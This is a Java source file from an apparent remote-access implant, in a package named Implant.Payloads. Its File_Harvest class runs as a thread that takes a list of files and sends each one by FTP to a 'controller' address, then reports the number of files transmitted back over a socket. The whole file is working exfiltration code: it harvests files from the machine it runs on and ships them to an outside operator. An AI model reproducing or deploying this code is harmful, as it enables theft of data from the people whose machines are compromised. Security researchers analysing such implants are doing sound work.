/**
 * The purpose of this thread is to handle sending all files specified in the data structure passed in to the thread
 * 
 * 
 * @author Solomon Sonya 
 */


package Implant.Payloads;


import GeoLocation.GeoThread;
import GeoLocation.ShowMap;
import Implant.Driver;
import Implant.ProcessHandlerThread;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;
import RunningProcess.*;
import java.io.*;

import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;
import javax.swing.*;
import javax.swing.Timer;
import java.awt.*;
import java.awt.event.*;

public class File_Harvest extends Thread implements Runnable
{
	private static final String strMyClassName = "File_Harvest";
	
	String strFTP_Address = "";
	int PORT = 0;	
	PrintWriter sktOut = null;
	
	ArrayList<File> alFileList = new ArrayList<File>();
	
	int numFilesSent = 0;
	String specialSendType = "";
	
	public File_Harvest(ArrayList<File> alFilesToSend, String FTP_address, int prt, PrintWriter socketOut, String specialFileSendingType_null_is_ok)
	{
		try
		{
			alFileList = alFilesToSend;
			strFTP_Address = FTP_address;
			PORT = prt;
			sktOut = socketOut;
			specialSendType = specialFileSendingType_null_is_ok;
			
		}
		catch(Exception  e)
		{
			Driver.eop("File_Harvest Constructor", strMyClassName, e, e.getLocalizedMessage(), false);
		}
						
		
	}
	
	public void run()
	{
		if(alFileList == null || alFileList.size() < 1)
		{
			Driver.sop("EMPTY FILE LISTING PROVIDED.  NO FILES TO SEND TO CONTROLLER!");
		}
		else//we have at least one file to send
		{
			sendFiles(alFileList, strFTP_Address, PORT, sktOut, specialSendType);
			

			Driver.sop("... --> Done!\n\nSENDING OF FILEs COMPLETE. " + numFilesSent + " file(s) transmitted to requestor");
			sktOut.println("SENDING OF FILEs COMPLETE. " + numFilesSent + " file(s) transmitted to requestor");
			sktOut.flush();
		}		
		
	}
	
	public boolean sendFiles(ArrayList<File> listToSend, String addrToController, int PORT_to_Controller, PrintWriter sktOut, String sendType)
	{
		try
		{
			File fleToSend = null;
			
			IncrementObject statusIncrement = null;
			try	{	statusIncrement =	new IncrementObject((double)(100.0/listToSend.size()));	}catch(Exception e){statusIncrement = null;}
			
			for(int i = 0; i < listToSend.size(); i++)
			{
				fleToSend = listToSend.get(i);
				
				if(fleToSend != null && fleToSend.exists() && fleToSend.isFile())
				{
					FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, addrToController, PORT_to_Controller, FTP_ServerSocket.maxFileReadSize_Bytes, fleToSend, sktOut, false, sendType, statusIncrement);
					FTP_Sender.start();
					
					try{this.numFilesSent++;}catch(Exception e){}
				}
				//else//consider going into the directory and adding all files found here!
			}
			
			return true;
		}
		
		catch(Exception e)
		{
			Driver.eop("sendFiles", strMyClassName, e, "Perhaps empty arraylist provided...", false);
		}
		
		return false;
	}
}
